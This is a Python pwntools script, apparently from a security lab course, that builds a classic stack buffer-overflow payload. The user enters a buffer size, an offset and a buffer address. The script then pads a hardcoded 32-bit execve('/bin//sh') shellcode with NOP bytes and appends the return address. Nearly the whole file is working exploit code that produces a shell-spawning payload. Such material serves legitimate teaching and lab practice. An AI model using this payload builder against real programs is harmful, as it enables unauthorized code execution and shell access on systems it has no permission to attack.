from pwn import *
from termcolor import colored, cprint

# ***------------------------------***
#  This script is used to create a 
#  payload dynamically in multiple
#  possible formats. It is similar
#  to the buildAPayload script, but
#  it is centered on payloads with
#  shellcode instead of parameters.
# ***------------------------------***

shellcode=\
b'\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
# shellcode sourced from seed lab project 2

def create_shellcode():
	cprint( "\nAssuming shellcode is contained inside the buffer.", "yellow")
	
	cprint( "What is the", "yellow", end=" ")
	cprint( "size of the buffer", "red", attrs=["bold","underline"], end=" ")
	cprint( "(ex 64)", "yellow")
	buffer_size = input()
	buffer_size = int(buffer_size)
	
	cprint( "Enter the", "yellow", end=" ")
	cprint( "offset of the shellcode", "red", attrs=["bold","underline"], end=" ")
	cprint( "from the start of the buffer (ex 16)", "yellow")
	shellcode_offset = input()
	shellcode_offset = int(shellcode_offset)
	
	shellcode_length = len(shellcode)
	
	remainder = buffer_size - shellcode_offset - shellcode_length
	
	payload = (b'\x90' * shellcode_offset) + ( shellcode ) + ( b'\x90' * remainder )
	
	cprint( "Enter the", "yellow", end=" ")
	cprint( "address of the input buffer", "red", attrs=["bold","underline"], end=" ")
	cprint( "(ex 401246)", "yellow")
	input_address = input()
	input_address = int(input_address, 16)
	
	payload += p32(input_address)
	
	print("\nHere is your payload!\n", payload)
	
